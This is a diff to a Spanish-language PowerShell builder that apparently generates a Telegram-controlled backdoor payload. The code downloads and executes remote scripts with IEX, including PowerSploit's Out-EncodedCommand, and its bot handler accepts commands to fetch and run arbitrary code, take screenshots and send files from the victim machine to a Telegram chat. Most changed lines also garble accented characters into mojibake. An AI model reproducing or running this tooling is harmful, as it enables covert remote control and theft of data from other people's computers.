@@ -17,21 +17,21 @@ Write-Host $banner -ForegroundColor Green ; Write-Host "`n                      
 
 Write-Host "`n[" -ForegroundColor Green  -NoNewline ;Write-Host "+" -ForegroundColor Red -NoNewline ;Write-Host "] Introduzca el Token del Bot de Telegram: " -ForegroundColor Green -NoNewline ; [string]$your_token = Read-Host
 Write-Host "`n[" -ForegroundColor Green  -NoNewline ;Write-Host "+" -ForegroundColor Red -NoNewline ;Write-Host "] Introduzca su Chat ID: " -ForegroundColor Green -NoNewline ; [int]$your_chat_id = Read-Host
-Write-Host "`n[" -ForegroundColor Green  -NoNewline ;Write-Host "+" -ForegroundColor Red -NoNewline ;Write-Host "] Introduzca el delay para la conexión: " -ForegroundColor Green -NoNewline ; [int]$your_delay = Read-Host
+Write-Host "`n[" -ForegroundColor Green  -NoNewline ;Write-Host "+" -ForegroundColor Red -NoNewline ;Write-Host "] Introduzca el delay para la conexiÃ³n: " -ForegroundColor Green -NoNewline ; [int]$your_delay = Read-Host
 
 Function check-command
 {
  Param ($command)
  $antigua_config = $ErrorActionPreference
- $ErrorActionPreference = ‘stop’
+ $ErrorActionPreference = â€˜stopâ€™
  try {if(Get-Command $command){RETURN $true}}
  Catch { RETURN $false}
  Finally {$ErrorActionPreference=$antigua_config}
  }
-if ((check-command Invoke-WebRequest) -eq $false) {$objeto = "system.net.webclient" ; $webclient = New-Object $objeto ; $webrequest = $webclient.DownloadString("https://raw.githubusercontent.com/mwjcomputing/MWJ-Blog-Respository/master/PowerShell/Invoke-WebRequest.ps1");Write-Host "`n[" -ForegroundColor Green  -NoNewline ;Write-Host "+" -ForegroundColor Red -NoNewline ;Write-Host "] Cargamos la función Invoke-Webrequest`n" -ForegroundColor Green -NoNewline ; IEX $webrequest}
-Write-Host "`n[" -ForegroundColor Green  -NoNewline ;Write-Host "+" -ForegroundColor Red -NoNewline ;Write-Host "] Cargamos la función Out-EncodedCommand de PowerSploit `n" -ForegroundColor Green -NoNewline 
+if ((check-command Invoke-WebRequest) -eq $false) {$objeto = "system.net.webclient" ; $webclient = New-Object $objeto ; $webrequest = $webclient.DownloadString("https://raw.githubusercontent.com/mwjcomputing/MWJ-Blog-Respository/master/PowerShell/Invoke-WebRequest.ps1");Write-Host "`n[" -ForegroundColor Green  -NoNewline ;Write-Host "+" -ForegroundColor Red -NoNewline ;Write-Host "] Cargamos la funciÃ³n Invoke-Webrequest`n" -ForegroundColor Green -NoNewline ; IEX $webrequest}
+Write-Host "`n[" -ForegroundColor Green  -NoNewline ;Write-Host "+" -ForegroundColor Red -NoNewline ;Write-Host "] Cargamos la funciÃ³n Out-EncodedCommand de PowerSploit `n" -ForegroundColor Green -NoNewline 
 IEX (Invoke-WebRequest "https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/ScriptModification/Out-EncodedCommand.ps1").content
-Write-Host "`n[" -ForegroundColor Green  -NoNewline ;Write-Host "+" -ForegroundColor Red -NoNewline ;Write-Host "] Tu código es: `n`n" -ForegroundColor Green -NoNewline  ; sleep -Seconds 1
+Write-Host "`n[" -ForegroundColor Green  -NoNewline ;Write-Host "+" -ForegroundColor Red -NoNewline ;Write-Host "] Tu cÃ³digo es: `n`n" -ForegroundColor Green -NoNewline  ; sleep -Seconds 1
 $scriptblock = {
 param (
 [string]$botkey = "your_token",
@@ -60,7 +60,7 @@ Write-Host "$comando"
  if ($comando -like "/kill" -and $first_connect -gt 10) {$texto = "$env:COMPUTERNAME disconected"; envia-mensaje -text $texto -botkey $botkey -chat $chat_id; $kill = $true}
  if ($comando -like "/Scriptimport") {$comando = $comando -replace "/scriptimport ","" ;$comando = IEX(wget $comando);$texto = IEX $comando | Out-String ; envia-mensaje -text $texto -botkey $botkey -chat $chat_id}
  if ($comando -like "/Screenshot") {screen-shot -botkey $botkey -chat $chat_id}
- if ($comando -like "/Download") {$file = $comando -replace "/Download " ; bot-send -file $file -botkey $botkey -chat_id $chat_id}
+ if ($comando -like "/Download*") {$file = $comando -replace "/Download ", "" ; bot-send -file $file -botkey $botkey -chat_id $chat_id}
  if ($chat_id -eq $null -or $chat_id -eq "") {$chat_id = (bot-public).chat_id}
 
    		$i++
